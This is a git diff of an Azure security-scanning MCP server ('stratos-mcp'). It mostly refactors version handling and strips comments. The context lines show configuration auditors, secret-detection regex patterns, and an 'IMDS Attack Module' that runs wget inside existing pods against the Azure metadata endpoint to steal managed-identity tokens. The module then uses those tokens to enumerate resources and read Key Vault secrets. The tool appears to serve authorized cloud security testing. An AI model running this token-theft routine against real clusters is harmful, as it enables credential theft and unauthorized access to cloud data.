@@ -6,6 +6,16 @@ import {
   ListToolsRequestSchema,
   CompleteRequestSchema,
 } from "@modelcontextprotocol/sdk/types.js";
+import { readFileSync } from 'fs';
+import { fileURLToPath } from 'url';
+import { dirname, join } from 'path';
+
+// Read version from package.json (single source of truth)
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+const packageJson = JSON.parse(readFileSync(join(__dirname, '../package.json'), 'utf-8'));
+const SERVER_VERSION = packageJson.version;
+
 import { AzureCliCredential, DefaultAzureCredential, ChainedTokenCredential } from "@azure/identity";
 import { SubscriptionClient } from "@azure/arm-subscriptions";
 import { ResourceManagementClient } from "@azure/arm-resources";
@@ -39,7 +49,6 @@ const credential = new ChainedTokenCredential(
   new DefaultAzureCredential()   // Fallback to other methods
 );
 
-// ========== AZURE LOCATIONS ==========
 // All Azure regions/locations
 const AZURE_LOCATIONS = [
   // Americas
@@ -101,9 +110,7 @@ function formatResponse(data: any, format: string | undefined, toolName: string)
   return typeof data === 'string' ? data : JSON.stringify(data);
 }
 
-// ============================================
 // INPUT VALIDATION (Security Enhancement)
-// ============================================
 
 /**
  * Azure resource ID patterns for validation
@@ -288,7 +295,7 @@ function validateResourceName(resourceName: string | undefined, required: boolea
 const server = new Server(
   {
     name: "stratos-mcp",
-    "version": "1.10.6",
+    "version": SERVER_VERSION,
   },
   {
     capabilities: {
@@ -1016,7 +1023,6 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
           openWorld: true
         }
       },
-      // ========== NEW SECURITY TOOLS ==========
       {
         name: "azure_analyze_function_apps",
         description: "Azure Functions security analysis: authentication settings, managed identity, VNet integration, CORS configuration, application settings for secrets, runtime version vulnerabilities",
@@ -2159,14 +2165,12 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         
         const locationSummary: Record<string, { resourceGroups: number; vms: number; storage: number; total: number }> = {};
         
-        // Get all resources and group by location
         const allResources: Array<{ location?: string; type?: string }> = [];
         
         for await (const resource of resourceClient.resources.list()) {
           allResources.push({ location: resource.location, type: resource.type });
         }
 
-        // Get resource groups
         const resourceGroups: Array<{ location?: string }> = [];
         for await (const rg of resourceClient.resourceGroups.list()) {
           resourceGroups.push({ location: rg.location });
@@ -2467,7 +2471,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           const accountFindings: any[] = [];
           let riskScore = 0;
 
-          // Check public blob access
           if (account.allowBlobPublicAccess === true) {
             accountFindings.push({
               severity: "HIGH",
@@ -2479,7 +2482,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 30;
           }
 
-          // Check HTTPS-only (secure transfer)
           if (account.enableHttpsTrafficOnly === false) {
             accountFindings.push({
               severity: "CRITICAL",
@@ -2491,7 +2493,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 40;
           }
 
-          // Check minimum TLS version
           if (account.minimumTlsVersion !== "TLS1_2") {
             accountFindings.push({
               severity: "HIGH",
@@ -2503,7 +2504,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 25;
           }
 
-          // Check network rules (firewall)
           if (!account.networkRuleSet || account.networkRuleSet.defaultAction === "Allow") {
             accountFindings.push({
               severity: "MEDIUM",
@@ -2515,7 +2515,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 15;
           }
 
-          // Check if private endpoints exist
           const hasPrivateEndpoints = account.privateEndpointConnections && account.privateEndpointConnections.length > 0;
           if (!hasPrivateEndpoints && account.networkRuleSet?.defaultAction !== "Deny") {
             accountFindings.push({
@@ -2528,7 +2527,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 10;
           }
 
-          // Check encryption
           if (!account.encryption || !account.encryption.services?.blob?.enabled) {
             accountFindings.push({
               severity: "CRITICAL",
@@ -2540,7 +2538,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 50;
           }
 
-          // Check shared key access
           if (account.allowSharedKeyAccess !== false) {
             accountFindings.push({
               severity: "LOW",
@@ -2606,7 +2603,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         const databasePorts = [1433, 3306, 5432, 27017, 6379, 9042]; // SQL, MySQL, PostgreSQL, MongoDB, Redis, Cassandra
         const wildcardSources = ["*", "0.0.0.0/0", "Internet", "Any"];
 
-        // Get NSGs
         let nsgs: any[] = [];
         if (nsgName && resourceGroup) {
           const nsg = await networkClient.networkSecurityGroups.get(resourceGroup, nsgName);
@@ -2630,7 +2626,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           const nsgFindings: any[] = [];
           let riskScore = 0;
 
-          // Analyze security rules
           const allRules = [
             ...(nsg.securityRules || []),
             ...(nsg.defaultSecurityRules || []),
@@ -2641,17 +2636,14 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
               const sourceAddress = rule.sourceAddressPrefix || rule.sourceAddressPrefixes?.join(',') || "";
               const destPort = rule.destinationPortRange || rule.destinationPortRanges?.join(',') || "";
               
-              // Check for wildcard source
               const hasWildcardSource = wildcardSources.some(wild => 
                 sourceAddress.includes(wild) || sourceAddress === ""
               );
 
-              // Check for management ports
               const exposedMgmtPorts = managementPorts.filter(port => 
                 destPort.includes(String(port)) || destPort === "*" || destPort.includes("0-65535")
               );
 
-              // Check for database ports
               const exposedDbPorts = databasePorts.filter(port => 
                 destPort.includes(String(port)) || destPort === "*" || destPort.includes("0-65535")
               );
@@ -2755,7 +2747,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         const networkClient = new NetworkManagementClient(credential, subscriptionId);
         const publicIps: any[] = [];
 
-        // Get public IPs
         let ips;
         if (resourceGroup) {
           ips = networkClient.publicIPAddresses.list(resourceGroup);
@@ -2826,9 +2817,7 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         // Determine scope
         const targetScope = scope || `/subscriptions/${subscriptionId}`;
 
-        // Get role assignments
         for await (const assignment of authClient.roleAssignments.listForScope(targetScope)) {
-          // Get role definition details
           let roleName = "Unknown";
           let roleType = "Unknown";
           try {
@@ -2890,7 +2879,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         const resourceClient = new ResourceManagementClient(credential, subscriptionId);
         const sqlServers: any[] = [];
 
-        // Get SQL servers
         const servers = resourceGroup
           ? sqlClient.servers.listByResourceGroup(resourceGroup)
           : sqlClient.servers.list();
@@ -2901,7 +2889,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           const serverRg = server.id?.split('/')[4] || resourceGroup || "";
           const serverName = server.name || "";
 
-          // Check firewall rules for allow-all
           const firewallRules = await sqlClient.firewallRules.listByServer(serverRg, serverName);
           let hasAllowAll = false;
           for await (const rule of firewallRules) {
@@ -2919,7 +2906,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             }
           }
 
-          // Check Azure AD authentication
           if (!server.administrators || !server.administrators.azureADOnlyAuthentication) {
             serverFindings.push({
               severity: "HIGH",
@@ -2932,7 +2918,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 30;
           }
 
-          // Check public network access
           if (server.publicNetworkAccess === "Enabled") {
             serverFindings.push({
               severity: "MEDIUM",
@@ -2944,7 +2929,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 15;
           }
 
-          // Get databases for TDE check
           const databases = await sqlClient.databases.listByServer(serverRg, serverName);
           let unencryptedDbs = 0;
           for await (const db of databases) {
@@ -3014,7 +2998,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           const vaultFindings: any[] = [];
           let riskScore = 0;
 
-          // Check soft delete
           if (!vault.properties?.enableSoftDelete) {
             vaultFindings.push({
               severity: "CRITICAL",
@@ -3026,7 +3009,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 50;
           }
 
-          // Check purge protection
           if (!vault.properties?.enablePurgeProtection) {
             vaultFindings.push({
               severity: "HIGH",
@@ -3038,7 +3020,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 30;
           }
 
-          // Check public network access
           if (vault.properties?.publicNetworkAccess === "Enabled" || !vault.properties?.networkAcls) {
             vaultFindings.push({
               severity: "MEDIUM",
@@ -3050,7 +3031,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 15;
           }
 
-          // Check RBAC vs Access Policies
           if (!vault.properties?.enableRbacAuthorization) {
             vaultFindings.push({
               severity: "LOW",
@@ -3106,7 +3086,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           const accountFindings: any[] = [];
           let riskScore = 0;
 
-          // Check public network access
           if (account.publicNetworkAccess === "Enabled") {
             accountFindings.push({
               severity: "HIGH",
@@ -3118,7 +3097,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 30;
           }
 
-          // Check IP firewall rules
           if (!account.ipRules || account.ipRules.length === 0) {
             accountFindings.push({
               severity: "MEDIUM",
@@ -3130,7 +3108,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 15;
           }
 
-          // Check virtual network rules
           if (!account.virtualNetworkRules || account.virtualNetworkRules.length === 0) {
             accountFindings.push({
               severity: "MEDIUM",
@@ -3186,7 +3163,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           let riskScore = 0;
           const vmRg = vm.id?.split('/')[4] || resourceGroup || "";
 
-          // Check OS disk encryption
           const osDiskEncrypted = vm.storageProfile?.osDisk?.encryptionSettings?.enabled || 
                                   vm.storageProfile?.osDisk?.managedDisk?.securityProfile?.securityEncryptionType;
           if (!osDiskEncrypted) {
@@ -3200,7 +3176,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 50;
           }
 
-          // Check data disks encryption
           let unencryptedDataDisks = 0;
           if (vm.storageProfile?.dataDisks) {
             for (const disk of vm.storageProfile.dataDisks) {
@@ -3220,7 +3195,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 30;
           }
 
-          // Check for security extensions
           const hasDefender = vm.resources?.some(ext => 
             ext.name?.includes("MDE") || ext.name?.includes("Defender"));
           const hasMonitoring = vm.resources?.some(ext => 
@@ -3282,7 +3256,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           const acrFindings: any[] = [];
           let riskScore = 0;
 
-          // Check admin user
           if (acr.adminUserEnabled) {
             acrFindings.push({
               severity: "CRITICAL",
@@ -3294,7 +3267,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 50;
           }
 
-          // Check public network access
           if (acr.publicNetworkAccess === "Enabled") {
             acrFindings.push({
               severity: "HIGH",
@@ -3306,7 +3278,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             riskScore += 30;
           }
 
-          // Check network rule set
           if (!acr.networkRuleSet || acr.networkRuleSet.defaultAction === "Allow") {
             acrFindings.push({
               severity: "MEDIUM",
@@ -3397,7 +3368,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
 
         const resourcesWithIdentity: any[] = [];
         for await (const resource of allResources) {
-          // Check if resource has identity (basic check via resource properties)
           if (resource.identity) {
             resourcesWithIdentity.push({
               resourceName: resource.name,
@@ -3444,7 +3414,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           { pattern: /\.(zip|tar|gz|7z|rar)$/i, category: "Archive", severity: "MEDIUM" },
         ];
 
-        // Get storage accounts to scan
         let accountsToScan: any[] = [];
         if (storageAccountName) {
           // Scan specific storage account
@@ -3474,7 +3443,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           let totalSensitiveFiles = 0;
 
           try {
-            // Get storage account keys
             const keys = await storageClient.storageAccounts.listKeys(accountRg, accountName);
             const accountKey = keys.keys?.[0]?.value;
 
@@ -3502,7 +3470,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
               const sensitiveBlobs: any[] = [];
               let blobCount = 0;
 
-              // Check container public access level
               const accessLevel = containerItem.properties?.publicAccess || "None";
               if (accessLevel !== "None") {
                 containerFindings.push({
@@ -3533,7 +3500,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                   const blobName = blob.name;
                   const blobUrl = `https://${accountName}.blob.core.windows.net/${containerName}/${blobName}`;
 
-                  // Check for sensitive file patterns
                   for (const { pattern, category, severity } of sensitivePatterns) {
                     if (pattern.test(blobName)) {
                       sensitiveBlobs.push({
@@ -3562,7 +3528,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                     }
                   }
 
-                  // Check blob metadata for SAS tokens
                   if (blob.metadata) {
                     const metadataStr = JSON.stringify(blob.metadata).toLowerCase();
                     if (metadataStr.includes('sig=') || metadataStr.includes('sastoken')) {
@@ -4020,7 +3985,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
               doc.moveDown();
             }
 
-            // Footer
             doc.fontSize(8).fillColor('#666')
               .text('Generated by Stratos v1.8.0', { align: 'center' });
 
@@ -4169,7 +4133,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
 
             for await (const assignment of roleAssignments) {
               const roleDefId = assignment.roleDefinitionId?.split('/').pop();
-              // Check if service principal with privileged role
               if (assignment.principalType === "ServicePrincipal") {
                 attackPaths.push({
                   severity: "HIGH",
@@ -4291,10 +4254,8 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         const containerClient = new ContainerServiceClient(credential, subscriptionId);
         
         try {
-          // Get cluster details
           const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
           
-          // Get credentials
           let credentialsResult;
           let credentialType;
           
@@ -4328,7 +4289,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             ? Buffer.from(kubeconfigBase64).toString('utf-8')
             : "N/A";
 
-          // Parse cluster info
           const fqdn = cluster.fqdn || "N/A";
           const apiServerUrl = `https://${fqdn}:443`;
           
@@ -4454,7 +4414,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           let highCount = 0;
           let mediumCount = 0;
 
-          // Get core API
           const coreApi = await connection.getCoreApi();
           const projects = await coreApi.getProjects();
 
@@ -4472,7 +4431,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                 report += `**Repositories:** ${repositories.length}\n\n`;
 
                 for (const repo of repositories) {
-                  // Get repository files (limited to avoid huge scans)
                   try {
                     const items = await gitApi.getItems(
                       repo.id!,
@@ -4486,7 +4444,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                       undefined
                     );
 
-                    // Check for common secret patterns in file names
                     const sensitivePatterns = [
                       '.env',
                       'secrets',
@@ -4537,10 +4494,8 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                 for (const definition of definitions) {
                   const fullDef = await buildApi.getDefinition(project.id!, definition.id!);
 
-                  // Check for inline scripts that might contain secrets
                   const defJson = JSON.stringify(fullDef);
 
-                  // Check for hardcoded patterns
                   const secretPatterns = [
                     { pattern: /password\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'Hardcoded password' },
                     { pattern: /connectionString\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'Connection string' },
@@ -4567,7 +4522,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                     }
                   }
 
-                  // Check for service connections
                   if (fullDef.process && (fullDef.process as any).type === 2) {
                     // YAML pipeline
                     report += `  - Pipeline type: YAML\n`;
@@ -4591,7 +4545,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
               report += `**Service Connections:** ${endpoints?.length || 0}\n\n`;
 
               for (const endpoint of endpoints || []) {
-                // Check for insecure authentication
                 if (endpoint.authorization?.scheme === 'UsernamePassword') {
                   findings.push({
                     severity: 'HIGH',
@@ -4604,7 +4557,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                   report += `- [WARN] **HIGH**: Service connection "${endpoint.name}" uses username/password auth\n`;
                 }
 
-                // Check for overly broad permissions
                 if (endpoint.isReady === false) {
                   findings.push({
                     severity: 'MEDIUM',
@@ -4669,7 +4621,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         }
       }
 
-      // ========== NEW SECURITY TOOLS ==========
       case "azure_analyze_function_apps": {
         const { subscriptionId, resourceGroup, format } = request.params.arguments as {
           subscriptionId: string;
@@ -4798,7 +4749,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           report += `**Subscription:** ${subscriptionId}\n`;
           report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
           
-          // Analyze NSGs
           report += `## Network Security Groups Analysis\n\n`;
           let criticalRules: string[] = [];
           let highRules: string[] = [];
@@ -4808,7 +4758,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             if (resourceGroup && nsg.location !== resourceGroup) continue;
             
             for (const rule of nsg.securityRules || []) {
-              // Check for overly permissive rules
               if (rule.access === 'Allow' && rule.direction === 'Inbound') {
                 const isAnySource = rule.sourceAddressPrefix === '*' || 
                                     rule.sourceAddressPrefix === '0.0.0.0/0' ||
@@ -4818,7 +4767,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                 if (isAnySource && isAnyPort) {
                   criticalRules.push(`**${nsg.name}/${rule.name}**: ANY source → ANY port (CRITICAL)`);
                 } else if (isAnySource) {
-                  // Check for sensitive ports
                   const port = rule.destinationPortRange || '';
                   const sensitivePort = ['22', '3389', '445', '1433', '3306', '5432'].includes(port);
                   if (sensitivePort) {
@@ -4945,7 +4893,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           const assignments = authClient.roleAssignments.listForSubscription();
           
           for await (const assignment of assignments) {
-            // Check if this assignment grants dangerous permissions
             const roleId = assignment.roleDefinitionId?.split('/').pop();
             
             // Well-known dangerous roles
@@ -5071,7 +5018,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           output += `**Scanner:** Stratos MCP v1.9.3\n\n`;
           output += `---\n\n`;
 
-          // Get cluster details
           const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
           
           let criticalCount = 0;
@@ -5160,7 +5106,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           } else {
             output += `| Azure AD Integration | ✅ Enabled | OK |\n`;
             
-            // Check for managed AAD vs legacy
             if (cluster.aadProfile.managed) {
               output += `| Managed AAD | ✅ Yes | OK |\n`;
             } else {
@@ -5173,7 +5118,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
               mediumCount++;
             }
 
-            // Check Azure RBAC for K8s
             if (cluster.aadProfile.enableAzureRbac) {
               output += `| Azure RBAC for K8s | ✅ Enabled | OK |\n`;
             } else {
@@ -5186,7 +5130,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
               mediumCount++;
             }
 
-            // Check admin group
             if (cluster.aadProfile.adminGroupObjectIDs && cluster.aadProfile.adminGroupObjectIDs.length > 0) {
               output += `| Admin Groups | ${cluster.aadProfile.adminGroupObjectIDs.length} configured | INFO |\n`;
             }
@@ -5343,7 +5286,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           if (cluster.addonProfiles?.azureKeyvaultSecretsProvider?.enabled) {
             output += `| Key Vault Secrets Provider | ✅ Enabled | OK |\n`;
             
-            // Check secret rotation
             const kvConfig = cluster.addonProfiles.azureKeyvaultSecretsProvider.config;
             if (kvConfig?.enableSecretRotation === 'true') {
               output += `| Secret Rotation | ✅ Enabled | OK |\n`;
@@ -5749,7 +5691,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           }
           output += '\n';
 
-          // ========== SUMMARY ==========
           output += `---\n\n`;
           output += `## 📊 Executive Summary\n\n`;
           output += `| Severity | Count |\n|----------|-------|\n`;
@@ -5819,12 +5760,10 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           output += `**Scanner:** Stratos MCP v1.9.8 (20 Security Checks)\n\n`;
           output += `---\n\n`;
 
-          // Get cluster credentials
           output += `## 🔑 Connecting to Cluster...\n\n`;
           
           const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
           
-          // Get admin credentials (kubeconfig)
           let kubeconfig: string;
           try {
             const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
@@ -6356,14 +6295,12 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                 const resources = rule.resources || [];
                 const apiGroups = rule.apiGroups || [];
                 
-                // Check for wildcard permissions (*)
                 if (verbs.includes('*') || resources.includes('*')) {
                   if (!wildcardRoles.find(r => r.name === roleName)) {
                     wildcardRoles.push({ name: roleName });
                   }
                 }
                 
-                // Check for dangerous verb combinations
                 const hasDangerousVerbs = ['create', 'update', 'patch', 'delete'].some(v => verbs.includes(v) || verbs.includes('*'));
                 const hasSensitiveResources = ['secrets', 'pods', 'deployments', 'daemonsets', 'roles', 'clusterroles', 'rolebindings', 'clusterrolebindings']
                   .some(r => resources.includes(r) || resources.includes('*'));
@@ -6670,18 +6607,15 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
                 const pullPolicy = container.imagePullPolicy || '';
                 allImages.add(image);
                 
-                // Check for :latest or no tag
                 if (image.endsWith(':latest') || !image.includes(':')) {
                   latestTagImages.push({ ns: podNs, pod: podName, image });
                 }
                 
-                // Check for public registries (no private registry prefix)
                 const isPublic = !image.includes('/') || publicRegistries.some(r => image.startsWith(r));
                 if (isPublic && !image.includes('.azurecr.io') && !image.includes('.ecr.')) {
                   publicRegistryImages.push({ ns: podNs, pod: podName, image });
                 }
                 
-                // Check for missing imagePullPolicy
                 if (!pullPolicy || pullPolicy === 'IfNotPresent') {
                   noPullPolicyImages.push({ ns: podNs, pod: podName, image });
                 }
@@ -6892,7 +6826,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             output += `| Server | ${gitVersion} |\n`;
             output += `| Major.Minor | ${major}.${minor} |\n\n`;
             
-            // Check for known vulnerable versions
             const minorNum = parseInt(minor);
             if (minorNum < 25) {
               output += `### ⚠️ Outdated Kubernetes Version\n\n`;
@@ -6991,7 +6924,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           }
           output += '\n';
 
-          // ========== SUMMARY ==========
           output += `---\n\n`;
           output += `## 📊 Live Scan Summary\n\n`;
           output += `| Severity | Count |\n|----------|-------|\n`;
@@ -7066,15 +6998,13 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           output += `**Subscription:** ${subscriptionId}\n`;
           output += `**Namespace Scope:** ${namespace || 'ALL'}\n`;
           output += `**Scan Time:** ${new Date().toISOString()}\n`;
-          output += `**Scanner:** Stratos MCP v1.10.4 (IMDS Attack Module)\n\n`;
+          output += `**Scanner:** Stratos MCP v${SERVER_VERSION} (IMDS Attack Module)\n\n`;
           output += `---\n\n`;
 
-          // Get cluster credentials
           output += `## 🔑 Phase 0: Cluster Connection\n\n`;
           
           const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
           
-          // Get admin credentials (kubeconfig)
           let kubeconfig: string;
           try {
             const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
@@ -7149,7 +7079,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           let criticalCount = 0, highCount = 0, mediumCount = 0, lowCount = 0;
           let tenantId = '';
 
-          // ========== PHASE 1: ENUMERATE EXISTING PODS ==========
           output += `## 🎯 Phase 1: Enumerate Existing Pods\n\n`;
           output += `**Approach:** Using EXISTING running pods only (no pod creation)\n\n`;
           
@@ -7228,7 +7157,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             }
             output += `\n`;
             
-            // Summary
             output += `### IMDS Exposure Summary\n\n`;
             output += `| Metric | Value |\n|--------|-------|\n`;
             output += `| Total Pods Scanned | ${allPods.length} |\n`;
@@ -7267,7 +7195,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
           }
 
-          // ========== PHASE 2: SELECT VULNERABLE POD FOR EXPLOITATION ==========
           output += `## 💀 Phase 2: Token Theft from Vulnerable Pod\n\n`;
           
           // Use first exposed pod for token theft
@@ -7281,7 +7208,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             return await runKubectl(`exec -n ${targetPod.namespace} ${targetPod.name} ${containerArg} -- sh -c '${cmd}'`);
           };
 
-          // Get tenant ID
           try {
             const identityInfo = await execInPod(`wget -qO- --header="Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1`);
             if (identityInfo.includes('tenantId')) {
@@ -7354,7 +7280,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
           }
 
-          // ========== TOKEN EXPORT (Optional) ==========
           if (exportTokens && stolenTokens.length > 0) {
             output += `### 💾 Token Export\n\n`;
             
@@ -7389,7 +7314,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             }
           }
 
-          // Get ARM token for enumeration
           const armToken = stolenTokens.find(t => t.resource.includes('management.azure.com'))?.accessToken;
           
           if (!armToken) {
@@ -7398,7 +7322,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
           }
 
-          // ========== PHASE 3: ENUMERATE TOKEN PERMISSIONS ==========
           output += `## 📋 Phase 3: Token Permission Enumeration\n\n`;
           output += `Using stolen ARM token to discover accessible resources...\n\n`;
 
@@ -7506,7 +7429,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           }
           output += `\n`;
 
-          // ========== PHASE 4: DATA PLANE ACCESS ==========
           output += `## 🔓 Phase 4: Data Plane Access Testing\n\n`;
 
           // Key Vault secrets
@@ -7640,7 +7562,6 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
             }
           }
 
-          // ========== SUMMARY ==========
           output += `---\n\n`;
           output += `## 📊 Attack Summary\n\n`;
           
@@ -7675,7 +7596,7 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
           output += `2. **Enable Workload Identity** - \`az aks update -g ${resourceGroup} -n ${clusterName} --enable-workload-identity\`\n`;
           output += `3. **Reduce Identity Permissions** - Review kubelet managed identity RBAC\n\n`;
 
-          output += `---\n*Generated by Stratos MCP v1.10.4 - IMDS Exploitation*\n`;
+          output += `---\n*Generated by Stratos MCP v${SERVER_VERSION} - IMDS Exploitation*\n`;
 
           // Cleanup
           try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
@@ -7735,7 +7656,7 @@ async function main() {
   console.error("=".repeat(70));
   console.error("\n[OK] Server Status: Running");
   console.error("Transport: stdio");
-  console.error("Version: 1.10.1");
+  console.error(`Version: ${SERVER_VERSION}`);
   console.error("\nAvailable Tools (37):");
   console.error("\n  Multi-Location Scanning:");
   console.error("   1. list_active_locations     - Discover active Azure regions");
